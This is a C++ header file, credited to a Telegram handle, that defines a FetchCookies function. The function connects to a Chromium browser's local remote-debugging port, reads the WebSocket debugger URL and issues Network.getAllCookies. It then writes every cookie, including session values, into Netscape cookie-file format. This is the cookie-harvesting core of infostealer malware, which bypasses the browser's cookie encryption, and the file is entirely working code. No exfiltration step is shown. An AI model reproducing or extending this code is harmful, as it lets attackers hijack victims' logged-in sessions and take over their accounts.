#pragma once
#include "websocket_client.hpp"
#include <winhttp.h>
#include <regex>
#include "json.hpp"
#include "base64.hpp"

#pragma comment(lib, "winhttp.lib")
// coded by t.me/NyxEnigma
using json = nlohmann::json;

string FetchCookies(int port) {
    HINTERNET hSession = WinHttpOpen(L"CookieFetcher", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/json", NULL, NULL, NULL, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    WinHttpReceiveResponse(hRequest, NULL);

    string response;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        vector<char> buffer(size);
        DWORD downloaded;
        if (!WinHttpReadData(hRequest, buffer.data(), size, &downloaded)) break;
        response.append(buffer.data(), downloaded);
    }

    regex pattern("\"webSocketDebuggerUrl\":\\s*\"(ws://[^\"]+)\"");
    smatch match;
    string wsUrl;
    if (!regex_search(response, match, pattern)) return "";
    wsUrl = match[1];

    size_t pos = wsUrl.find("ws://");
    if (pos != string::npos) wsUrl = wsUrl.substr(pos + 5);

    string host = "127.0.0.1";
    int wsPort = stoi(wsUrl.substr(wsUrl.find(':') + 1, wsUrl.find('/') - wsUrl.find(':') - 1));
    string path = wsUrl.substr(wsUrl.find('/'));

    WebSocketClient ws(host, wsPort);
    if (!ws.Connect() || !ws.Handshake(path)) return "";

    ws.Send(R"({"id":1,"method":"Network.getAllCookies"})");
    string wsResponse = ws.Receive();

    json cookieData;
    try { cookieData = json::parse(wsResponse); }
    catch (...) { return ""; }

    if (!cookieData.contains("result") || !cookieData["result"].contains("cookies"))
        return "";

    string output;
    for (auto& cookie : cookieData["result"]["cookies"]) {
        try {
            output += cookie["domain"].get<string>() + "\t" +
                (cookie["domain"].get<string>().front() == '.' ? "TRUE" : "FALSE") + "\t" +
                cookie["path"].get<string>() + "\t" +
                (cookie["secure"].get<bool>() ? "TRUE" : "FALSE") + "\t" +
                to_string(cookie["expires"].get<long long>()) + "\t" +
                cookie["name"].get<string>() + "\t" +
                cookie["value"].get<string>() + "\n";
        }
        catch (...) {}
    }

    return output;
}